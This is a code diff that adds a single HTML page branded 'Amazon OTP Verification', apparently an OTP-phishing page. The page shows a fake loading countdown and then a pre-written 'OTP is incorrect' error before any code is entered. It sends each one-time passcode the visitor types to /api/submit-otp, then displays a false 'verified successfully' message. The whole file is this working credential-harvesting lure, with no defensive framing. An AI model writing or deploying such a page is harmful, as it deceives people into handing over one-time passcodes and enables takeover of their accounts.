@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Amazon OTP Verification</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background:#fff;
+    margin:0;
+    padding:0;
+    text-align: center;
+  }
+  .container {
+    max-width: 400px;
+    margin: 80px auto;
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+  }
+  h1 {
+    font-weight: normal;
+    margin-bottom: 15px;
+  }
+  #loading {
+    margin: 20px 0;
+    font-size: 18px;
+    color: #555;
+  }
+  input[type="text"] {
+    width: 70%;
+    padding: 10px;
+    font-size: 16px;
+    margin-top: 15px;
+  }
+  button {
+    padding: 10px 20px;
+    font-size: 16px;
+    margin-left: 10px;
+    cursor: pointer;
+  }
+  #message {
+    margin-top: 15px;
+    font-weight: bold;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>OTP Verification</h1>
+  <div id="loading">Loading...</div>
+  <form id="otpForm" style="display:none;">
+    <input type="text" id="otpInput" placeholder="Enter OTP" required maxlength="6" />
+    <button type="submit">Verify</button>
+  </form>
+  <div id="message"></div>
+  <div id="datetime" style="margin-top:20px; color:#888;"></div>
+</div>
+
+<script>
+  let attempt = 1;
+
+  function updateDateTime() {
+    const now = new Date();
+    const formatted = now.toLocaleString();
+    document.getElementById('datetime').textContent = formatted;
+  }
+  updateDateTime();
+  setInterval(updateDateTime, 1000);
+
+  const loadingEl = document.getElementById('loading');
+  const formEl = document.getElementById('otpForm');
+  const messageEl = document.getElementById('message');
+  const otpInput = document.getElementById('otpInput');
+
+  function showLoading(seconds) {
+    loadingEl.style.display = 'block';
+    formEl.style.display = 'none';
+    messageEl.textContent = `Please wait ${seconds} seconds...`;
+    return new Promise((resolve) => {
+      let count = seconds;
+      const interval = setInterval(() => {
+        count--;
+        messageEl.textContent = `Please wait ${count} seconds...`;
+        if(count <= 0) {
+          clearInterval(interval);
+          resolve();
+        }
+      }, 1000);
+    });
+  }
+
+  async function sendOtp(otp, attemptNum) {
+    await fetch('/api/submit-otp', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({otp, attempt: attemptNum})
+    });
+  }
+
+  async function firstAttemptFlow() {
+    await showLoading(10);
+    loadingEl.style.display = 'none';
+    formEl.style.display = 'block';
+    messageEl.textContent = 'OTP is incorrect. Please try again.';
+  }
+
+  async function secondAttemptFlow() {
+    await showLoading(5);
+    messageEl.style.color = 'green';
+    messageEl.textContent = 'OTP verified successfully!';
+    formEl.style.display = 'none';
+  }
+
+  formEl.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const otp = otpInput.value.trim();
+    if(!otp) return;
+
+    await sendOtp(otp, attempt);
+
+    if(attempt === 1) {
+      attempt++;
+      secondAttemptFlow();
+    }
+  });
+
+  firstAttemptFlow();
+</script>
+
+</body>
+</html>
